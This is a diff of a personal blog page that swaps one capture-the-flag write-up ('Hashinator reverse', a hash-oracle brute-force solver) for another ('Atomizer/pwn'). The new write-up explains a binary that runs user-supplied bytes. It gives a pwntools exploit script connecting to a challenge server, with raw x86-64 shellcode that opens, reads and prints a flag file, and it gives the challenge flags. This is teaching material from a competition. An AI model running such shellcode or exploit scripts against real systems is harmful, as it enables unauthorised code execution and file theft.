@@ -19,21 +19,21 @@
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
   
-    <meta name="description" content="challenge_final — WriteupAnalysisThe binary reads input from stdin and requires at least 15 characters.For an input of length N, it prints N+1 hexadecimal hashes. Example: 1238350e5...6bf156...591a83.">
+    <meta name="description" content="Atomizer — WriteupChallenge OverviewThis binary is essentially a shellcode loader.Instead of exploiting a memory corruption bug, the program intentionally gives us executable memory and jumps to whate">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Hashinator reverse">
-<meta property="og:url" content="https://defexnn.github.io/my-blog/2026/02/08/hasinator/index.html">
+<meta property="og:title" content="Atomizer&#x2F;pwn">
+<meta property="og:url" content="https://defexnn.github.io/my-blog/2026/02/08/atomizer/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="challenge_final — WriteupAnalysisThe binary reads input from stdin and requires at least 15 characters.For an input of length N, it prints N+1 hexadecimal hashes. Example: 1238350e5...6bf156...591a83.">
+<meta property="og:description" content="Atomizer — WriteupChallenge OverviewThis binary is essentially a shellcode loader.Instead of exploiting a memory corruption bug, the program intentionally gives us executable memory and jumps to whate">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2026-02-08T01:30:33.497Z">
-<meta property="article:modified_time" content="2026-02-08T01:35:43.815Z">
+<meta property="article:published_time" content="2026-02-08T13:14:24.456Z">
+<meta property="article:modified_time" content="2026-02-08T01:47:56.855Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
   
   
   
-  <title>Hashinator reverse - Hexo</title>
+  <title>Atomizer/pwn - Hexo</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -175,7 +175,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="Hashinator reverse"></span>
+            <span id="subtitle" data-typed-text="Atomizer/pwn"></span>
           
         </div>
 
@@ -186,8 +186,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2026-02-08 03:30" pubdate>
-          February 8, 2026 am
+        <time datetime="2026-02-08 15:14" pubdate>
+          February 8, 2026 pm
         </time>
       </span>
     
@@ -198,7 +198,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.8k words
+          2.6k words
         
       </span>
     
@@ -209,7 +209,7 @@
         
         
         
-          16 mins
+          22 mins
         
       </span>
     
@@ -246,51 +246,71 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">Hashinator reverse</h1>
+            <h1 id="seo-header">Atomizer/pwn</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="challenge-final-—-Writeup"><a href="#challenge-final-—-Writeup" class="headerlink" title="challenge_final — Writeup"></a>challenge_final — Writeup</h1><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>The binary reads input from <strong>stdin</strong> and requires at least 15 characters.<br>For an input of length <code>N</code>, it prints <code>N+1</code> hexadecimal hashes.</p>
-<p>Example:</p>
-<figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs erlang"><span class="hljs-number">8350e5</span>...<br><span class="hljs-number">6</span>bf156...<br><span class="hljs-number">591</span>a83...<br></code></pre></td></tr></table></figure>
-
-<p>This indicates the program exposes <strong>incremental hash states</strong>:</p>
-<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">H0</span> <span class="hljs-operator">=</span> hash(<span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-attribute">H1</span> <span class="hljs-operator">=</span> hash(first_char)<br><span class="hljs-attribute">H2</span> <span class="hljs-operator">=</span> hash(first_two_chars)<br>...<br></code></pre></td></tr></table></figure>
-
-<p>So each line corresponds to the hash after processing another byte.</p>
+                <h2 id="Atomizer-—-Writeup"><a href="#Atomizer-—-Writeup" class="headerlink" title="Atomizer — Writeup"></a>Atomizer — Writeup</h2><h3 id="Challenge-Overview"><a href="#Challenge-Overview" class="headerlink" title="Challenge Overview"></a>Challenge Overview</h3><p>This binary is essentially a <strong>shellcode loader</strong>.<br>Instead of exploiting a memory corruption bug, the program intentionally gives us executable memory and jumps to whatever we place inside it.</p>
+<p>The challenge title and hint:</p>
+<blockquote>
+<p><em>“I hate it when something is not exactly the way I want it. So I just throw it away.”</em><br><em>“Too much or too little and it won’t spray.”</em></p>
+</blockquote>
+<p>Both point toward <strong>strict input size requirements</strong>.</p>
 <hr>
-<h2 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h2><p>The binary leaks <strong>internal hash states</strong>, turning it into a hashing oracle.</p>
-<p>Instead of reversing the algorithm, we can reconstruct the flag by matching each prefix hash.</p>
-<p>Important detail:</p>
-<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">hash[<span class="hljs-number">0</span>] → <span class="hljs-literal">empty</span> <span class="hljs-keyword">string</span><br>hash[i] → <span class="hljs-keyword">first</span> i <span class="hljs-keyword">characters</span><br></code></pre></td></tr></table></figure>
+<h2 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h2><p>The program does the following:</p>
+<h3 id="1-Allocates-RWX-memory"><a href="#1-Allocates-RWX-memory" class="headerlink" title="1. Allocates RWX memory"></a>1. Allocates RWX memory</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">sys_mmap(<span class="hljs-number">0x7770000</span>, <span class="hljs-number">0x1000</span>, <span class="hljs-number">7</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure>
 
-<p>Therefore, when brute-forcing character <code>pos</code>, compare:</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">hash</span>[pos + <span class="hljs-number">1</span>]<br></code></pre></td></tr></table></figure>
+<p>Permissions <code>7</code> &#x3D;</p>
+<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">PROT_READ | <span class="hljs-type">PROT_WRITE</span> | <span class="hljs-type">PROT_EXEC</span><br></code></pre></td></tr></table></figure>
 
-<p>(not <code>hash[pos]</code>).</p>
+<p>So we get memory that is:</p>
+<p>✅ writable<br>✅ executable<br>✅ at a fixed address</p>
+<p>No ASLR guessing needed.</p>
 <hr>
-<h2 id="Flag-Length"><a href="#Flag-Length" class="headerlink" title="Flag Length"></a>Flag Length</h2><p>Given <code>54</code> hashes:</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag_length</span> = <span class="hljs-number">54</span> - <span class="hljs-number">1</span> = <span class="hljs-number">53</span><br></code></pre></td></tr></table></figure>
+<h3 id="2-Reads-user-input-into-that-memory"><a href="#2-Reads-user-input-into-that-memory" class="headerlink" title="2. Reads user input into that memory"></a>2. Reads user input into that memory</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">sys_read(<span class="hljs-number">0</span>, addr + v2, <span class="hljs-number">69</span> - v2);<br></code></pre></td></tr></table></figure>
+
+<p>The loop continues until:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (v2 &gt;= <span class="hljs-number">69</span>)<br>    jump_to_shellcode();<br></code></pre></td></tr></table></figure>
+
+<p>If fewer bytes are sent → the program exits.</p>
+<p>If exactly 69 bytes are sent → execution jumps directly to our buffer.</p>
+<hr>
+<h2 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a>Root Cause</h2><p>The vulnerability is straightforward:</p>
+<blockquote>
+<p><strong>User-controlled data is executed as code without validation.</strong></p>
+</blockquote>
+<p>This is the textbook definition of arbitrary code execution.</p>
+<p>There is:</p>
+<ul>
+<li>no bounds check problem</li>
+<li>no stack overflow</li>
+<li>no ROP required</li>
+</ul>
+<p>The binary is deliberately designed to run shellcode.</p>
+<p>The only constraint is:</p>
+<h2 id="⚠️-You-MUST-send-exactly-69-bytes"><a href="#⚠️-You-MUST-send-exactly-69-bytes" class="headerlink" title="⚠️ You MUST send exactly 69 bytes."></a>⚠️ You MUST send exactly 69 bytes.</h2><p>Not 68.<br>Not 70.<br>Exactly.</p>
+<p>Otherwise the program “throws it away.”</p>
+<hr>
+<h2 id="Exploitation-Strategy"><a href="#Exploitation-Strategy" class="headerlink" title="Exploitation Strategy"></a>Exploitation Strategy</h2><p>At first glance, spawning <code>/bin/sh</code> seems like the obvious move.</p>
+<p>However, modern CTF infrastructure often removes shells or blocks them.</p>
+<p>When <code>execve(&quot;/bin/sh&quot;)</code> fails:</p>
+<p>👉 the process exits<br>👉 the socket closes<br>👉 you get EOF</p>
+<p>So the reliable strategy is:</p>
+<h2 id="Use-ORW-shellcode-Open-→-Read-→-Write"><a href="#Use-ORW-shellcode-Open-→-Read-→-Write" class="headerlink" title="Use ORW shellcode (Open → Read → Write)"></a>Use ORW shellcode (Open → Read → Write)</h2><p>Instead of spawning a shell, just read the flag directly.</p>
+<hr>
+<h2 id="Shellcode-Logic"><a href="#Shellcode-Logic" class="headerlink" title="Shellcode Logic"></a>Shellcode Logic</h2><p>We want to perform:</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">open</span><span class="hljs-params">(<span class="hljs-string">&quot;flag&quot;</span>, O_RDONLY)</span></span><br><span class="hljs-function"><span class="hljs-title">read</span><span class="hljs-params">(fd, buffer, <span class="hljs-number">100</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">write</span><span class="hljs-params">(<span class="hljs-number">1</span>, buffer, <span class="hljs-number">100</span>)</span></span><br></code></pre></td></tr></table></figure>
+
+<p>Since the mmap’d region is writable, it doubles as our buffer.</p>
+<p>After writing the shellcode, we simply pad with NOPs until we hit <strong>69 bytes</strong>.</p>
+<hr>
+<h2 id="Exploit-Script"><a href="#Exploit-Script" class="headerlink" title="Exploit Script"></a>Exploit Script</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><br>p = remote(<span class="hljs-string">&quot;52.59.124.14&quot;</span>, <span class="hljs-number">5020</span>)<br><br>shellcode = (<br>    <span class="hljs-string">b&quot;\x48\x31\xc0&quot;</span>                      <span class="hljs-comment"># xor rax,rax</span><br>    <span class="hljs-string">b&quot;\x50&quot;</span>                              <span class="hljs-comment"># push rax</span><br>    <span class="hljs-string">b&quot;\x48\xbb\x66\x6c\x61\x67\x00\x00\x00\x00&quot;</span>  <span class="hljs-comment"># &quot;flag&quot;</span><br>    <span class="hljs-string">b&quot;\x53&quot;</span>                              <span class="hljs-comment"># push rbx</span><br>    <span class="hljs-string">b&quot;\x48\x89\xe7&quot;</span>                      <span class="hljs-comment"># rdi -&gt; filename</span><br>    <span class="hljs-string">b&quot;\x48\x31\xf6&quot;</span>                      <span class="hljs-comment"># rsi = 0</span><br>    <span class="hljs-string">b&quot;\xb0\x02&quot;</span>                          <span class="hljs-comment"># open syscall</span><br>    <span class="hljs-string">b&quot;\x0f\x05&quot;</span><br><br>    <span class="hljs-string">b&quot;\x48\x89\xc7&quot;</span>                      <span class="hljs-comment"># rdi = fd</span><br>    <span class="hljs-string">b&quot;\x48\x89\xe6&quot;</span>                      <span class="hljs-comment"># rsi = buffer</span><br>    <span class="hljs-string">b&quot;\xb2\x64&quot;</span>                          <span class="hljs-comment"># read 100 bytes</span><br>    <span class="hljs-string">b&quot;\x48\x31\xc0&quot;</span>                      <span class="hljs-comment"># read syscall</span><br>    <span class="hljs-string">b&quot;\x0f\x05&quot;</span><br><br>    <span class="hljs-string">b&quot;\xbf\x01\x00\x00\x00&quot;</span>              <span class="hljs-comment"># stdout</span><br>    <span class="hljs-string">b&quot;\xb0\x01&quot;</span>                          <span class="hljs-comment"># write syscall</span><br>    <span class="hljs-string">b&quot;\x0f\x05&quot;</span><br>)<br><br>payload = shellcode.ljust(<span class="hljs-number">69</span>, <span class="hljs-string">b&quot;\x90&quot;</span>)<br><br>p.send(payload)<br><span class="hljs-built_in">print</span>(p.recvall().decode(errors=<span class="hljs-string">&quot;ignore&quot;</span>))<br></code></pre></td></tr></table></figure>
 
 <hr>
-<h2 id="Attack-Strategy"><a href="#Attack-Strategy" class="headerlink" title="Attack Strategy"></a>Attack Strategy</h2><ol>
-<li>Assume flag format <code>ENO{...}</code>.</li>
-<li>Build a candidate string of the correct length.</li>
-<li>Replace one character at a time.</li>
-<li>Run the binary.</li>
-<li>Match the hash at <code>pos+1</code>.</li>
-<li>Lock the correct character and continue.</li>
-</ol>
-<p>No need to reverse the hash function.</p>
-<hr>
-<h2 id="Solver"><a href="#Solver" class="headerlink" title="Solver"></a>Solver</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">import</span> string<br><br>BIN = <span class="hljs-string">&quot;./challenge_final&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">s</span>):<br>    p = subprocess.run(<br>        [BIN],<br>        <span class="hljs-built_in">input</span>=(s + <span class="hljs-string">&quot;\n&quot;</span>).encode(),<br>        stdout=subprocess.PIPE<br>    )<br>    <span class="hljs-keyword">return</span> [x.strip() <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> p.stdout.decode().splitlines() <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(x.strip()) == <span class="hljs-number">32</span>]<br><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;hashes.txt&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    TARGET = [x.strip() <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> f <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(x.strip()) == <span class="hljs-number">32</span>]<br><br>flag_len = <span class="hljs-built_in">len</span>(TARGET) - <span class="hljs-number">1</span><br>flag = <span class="hljs-built_in">list</span>(<span class="hljs-string">&quot;ENO&#123;&quot;</span> + <span class="hljs-string">&quot;A&quot;</span> * (flag_len - <span class="hljs-number">4</span>))<br><br>charset = string.ascii_letters + string.digits + <span class="hljs-string">&quot;_&#123;&#125;!-?&quot;</span><br><br><span class="hljs-keyword">for</span> pos <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>, flag_len):<br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> charset:<br>        flag[pos] = c<br>        hashes = run(<span class="hljs-string">&quot;&quot;</span>.join(flag))<br><br>        <span class="hljs-keyword">if</span> hashes[pos+<span class="hljs-number">1</span>] == TARGET[pos+<span class="hljs-number">1</span>]:<br>            <span class="hljs-keyword">break</span><br><br>flag[-<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;&#125;&quot;</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;FLAG:&quot;</span>, <span class="hljs-string">&quot;&quot;</span>.join(flag))<br></code></pre></td></tr></table></figure>
+<h2 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h2><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">ENO</span><span class="hljs-template-variable">&#123;GIVE_ME_THE_RIGHT_AMOUNT_OF_ATOMS_TO_WIN&#125;</span><br></code></pre></td></tr></table></figure>
 
 <hr>
-<h2 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a>Root Cause</h2><p>The program exposes intermediate hash states instead of validating only the final digest.</p>
-<p>This allows reconstruction of the secret sequentially without reversing the algorithm.</p>
-<hr>
-<h2 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h2><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">ENO&#123;MD2_1S_S00_0ld_B3tter_Implement_S0m3Th1ng_ElsE!!&#125;<br></code></pre></td></tr></table></figure>
 
                 
               </div>
@@ -308,8 +328,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>Hashinator reverse</div>
-      <div>https://defexnn.github.io/my-blog/2026/02/08/hasinator/</div>
+      <div>Atomizer/pwn</div>
+      <div>https://defexnn.github.io/my-blog/2026/02/08/atomizer/</div>
     </div>
     <div class="license-meta">
       
@@ -353,9 +373,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/my-blog/2026/02/08/atomizer/" title="Atomizer/pwn">
+                      <a href="/my-blog/2026/02/08/hashchain/" title="HashChain">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Atomizer/pwn</span>
+                        <span class="hidden-mobile">HashChain</span>
                         <span class="visible-mobile">Previous</span>
                       </a>
                     
@@ -363,8 +383,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/my-blog/2026/02/01/Very_Simple_Framer/" title="Very Simple Framer">
-                        <span class="hidden-mobile">Very Simple Framer</span>
+                      <a href="/my-blog/2026/02/08/hasinator/" title="Hashinator reverse">
+                        <span class="hidden-mobile">Hashinator reverse</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
